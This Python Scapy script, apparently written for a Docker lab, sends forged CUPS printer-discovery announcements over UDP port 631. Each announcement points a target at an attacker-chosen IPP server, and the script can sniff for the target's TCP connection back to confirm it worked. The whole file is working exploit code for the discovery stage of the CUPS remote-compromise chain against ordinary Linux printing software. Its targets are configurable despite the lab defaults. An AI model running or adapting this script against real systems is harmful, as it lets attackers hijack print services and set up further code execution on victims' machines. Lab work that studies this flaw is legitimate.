from scapy.all import Raw, send, sniff, rdpcap, wrpcap
from scapy.layers.inet import IP, UDP, TCP
import argparse
import logging
import sys
from pathlib import Path
import ipaddress

LOG = logging.getLogger("cups_attack")

# Method for checking a valid IPv4 address
def ipv4(value: str) -> str:
    """Only accept IPv4 addresses for this lab's IP/UDP packets."""
    try:
        return str(ipaddress.IPv4Address(value))
    except ipaddress.AddressValueError as exc:
        raise argparse.ArgumentTypeError(str(exc)) from exc


# Function for sending a packet
def transmit(packet, args: argparse.Namespace) -> None:
    LOG.info("Sending %d announcement(s) to %s:%d/udp",
             args.count, args.target_ip, args.target_port)
    send(packet, count=args.count, inter=args.interval, verbose=False)

# Function that checks for a valid port number
def port_number(value: str) -> int:
    try:
        port = int(value)
        if not 1 <= port <= 65535:
            raise ValueError
        return port
    except ValueError as exc:
        raise argparse.ArgumentTypeError("port must be 1..65535") from exc

# Function that parses the arguments from the CLI
def make_parser()-> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Send a custom CUPS printer-discovery packet via Scapy"
    )

    parser.add_argument("--target-ip", 
                        type=ipv4, 
                        default="10.77.77.2",
                        help="victim Docker host's Ethernet IP"
    )
    parser.add_argument("--target-port", 
                        type=port_number, 
                        default=631,
                        help="legacy CUPS browsing UDP port (default: 631)"
    )
    parser.add_argument("--printer-ip", 
                        type=ipv4, 
                        default="10.77.77.1",
                        help="advertised IPP server's Ethernet IP"
    )
    parser.add_argument("--printer-port", 
                        type=port_number, 
                        default=8000,
                        help="advertised IPP server's TCP port"
    )
    parser.add_argument("--resource", 
                        default="/printers/LabPrinter",
                        help="advertised path; /printers/ is accepted by the lab daemon"
    )
    parser.add_argument("--scheme", 
                        choices=("ipp", "ipps"), 
                        default="ipp"
    )
    parser.add_argument("--type", 
                        dest="printer_type", 
                        type=int, 
                        default=0,
                        help="legacy printer type field (default: 0)"
    )
    parser.add_argument("--state", 
                        type=int, 
                        default=3,
                        help="legacy printer state field (3=idle, 4=processing, 5=stopped)"
    )
    parser.add_argument("--location", 
                        default=None, help="optional descriptive field"
    )
    parser.add_argument("--info", 
                        default=None, 
                        help="optional printer name field"
    )
    parser.add_argument("--make-model", 
                        default=None, 
                        help="optional model field"
    )
    parser.add_argument("--count", 
                        type=int, 
                        default=1,
                        help="number of announcements (1..10)"
    )
    parser.add_argument("--interval", 
                        type=float, default=1.0,
                        help="seconds between announcements"
    )
    parser.add_argument("--pcap", 
                        type=Path, 
                        help="save the constructed packet to a PCAP"
    )
    parser.add_argument("--log-file", 
                        type=Path, 
                        help="also save log messages to a file"
    )
    parser.add_argument("--dry-run", 
                        action="store_true",
                        help="show and optionally export the packet without sending it"
    )
    parser.add_argument("--verify", 
                        action="store_true",
                        help="sniff for an inbound TCP SYN from the target after sending"
    )
    parser.add_argument("--iface", 
                        help="capture interface, e.g. en6 (required for --verify)"
    )
    parser.add_argument("--timeout", 
                        type=float, default=5,
                        help="seconds to observe a callback (default: 5)"
    )
    parser.add_argument("--capture-pcap", 
                        type=Path,
                        help="save observed TCP packets (requires --verify)"
    )
    return parser

# Function for validating the arguments used in the script.
def validate(args: argparse.Namespace, parser: argparse.ArgumentParser) -> None:
    if not args.resource.startswith("/") or any(c in args.resource for c in "\r\n \t\""):
        parser.error("--resource must be an absolute path without whitespace or quotes")
    if not 1 <= args.count <= 10:
        parser.error("--count must be between 1 and 10")
    if args.interval < 0.1 or not 0 <= args.printer_type <= 65535 or not 0 <= args.state <= 65535:
        parser.error("interval must be >= 0.1 and type/state must be 0..65535")
    if args.verify and not args.iface:
        parser.error("--verify requires --iface (your lab Ethernet interface)")
    if args.capture_pcap and not args.verify:
        parser.error("--capture-pcap requires --verify")
    if not 1 <= args.timeout <= 30:
        parser.error("--timeout must be 1..30 seconds")
    for name in ("location", "info", "make_model"):
        value = getattr(args, name)
        if value is not None and (len(value) > 200 or any(c in value for c in '\r\n"')):
            parser.error(f"--{name.replace('_', '-')} may not contain quotes or newlines")

# Function for building the packet we are to send to the CUPS service
def build_packet(args: argparse.Namespace):
    """Create one IP/UDP/Raw packet carrying a legacy CUPS announcement."""
    uri = f"{args.scheme}://{args.printer_ip}:{args.printer_port}{args.resource}"
    payload = f"{args.printer_type:x} {args.state:x} {uri}"

    if any(getattr(args, key) is not None for key in ("location", "info", "make_model")):
        payload += (f' "{args.location or ""}" "{args.info or ""}"'
                    f' "{args.make_model or ""}"')

    payload += "\n"
    packet = IP(dst=args.target_ip) / UDP(dport=args.target_port) / Raw(load=payload.encode("utf-8"))
    return packet, payload

def setup_logging(path: Path | None) -> None:
    handlers = [logging.StreamHandler(sys.stdout)]
    if path:
        path.parent.mkdir(parents=True, exist_ok=True)
        handlers.append(logging.FileHandler(path, encoding="utf-8"))
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s",
                        handlers=handlers)

def main() -> int:
    parser = make_parser()
    args = parser.parse_args()
    validate(args, parser)
    setup_logging(args.log_file)
    packet, payload = build_packet(args)
    LOG.info("Legacy CUPS announcement: %r", payload)

    if not args.resource.startswith(("/printers/", "/classes/")):
        LOG.warning("The vulnerable daemon may reject this resource path")

    if args.pcap:
        args.pcap.parent.mkdir(parents=True, exist_ok=True)
        wrpcap(str(args.pcap), [packet])
        LOG.info("Saved constructed packet to %s (not a network capture)", args.pcap)

    if args.dry_run:
        print(packet.show(dump=True))
        LOG.info("Dry run: no packets transmitted")
        return 0

    if args.verify:
        # Start the capture socket BEFORE transmitting, so a fast callback is not missed.
        capture_filter = f"tcp and src host {args.target_ip} and dst port {args.printer_port}"
        LOG.info("Monitoring %s for target TCP connections for %.1fs", args.iface, args.timeout)
        observed = sniff(
            iface=args.iface,
            filter=capture_filter,
            timeout=args.timeout,
            store=True,
            started_callback=lambda: transmit(packet, args),
        )
        if args.capture_pcap:
            args.capture_pcap.parent.mkdir(parents=True, exist_ok=True)
            wrpcap(str(args.capture_pcap), observed)
            LOG.info("Saved %d observed TCP packet(s) to %s", len(observed), args.capture_pcap)

        syns = [pkt for pkt in observed if IP in pkt and TCP in pkt
                and pkt[IP].src == args.target_ip and pkt[TCP].dport == args.printer_port
                and (int(pkt[TCP].flags) & 0x12) == 0x02]
        if syns:
            LOG.info("CALLBACK OBSERVED: %d TCP SYN(s) from %s to printer port %d",
                     len(syns), args.target_ip, args.printer_port)
            return 0
        LOG.warning("No TCP SYN observed; check Docker logs and Wireshark before concluding failure")
        return 1

    transmit(packet, args)
    LOG.info("Transmission complete; inspect Wireshark or container logs for the callback")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, PermissionError) as exc:
        LOG.error("Network or file error: %s", exc)
        raise SystemExit(2) from exc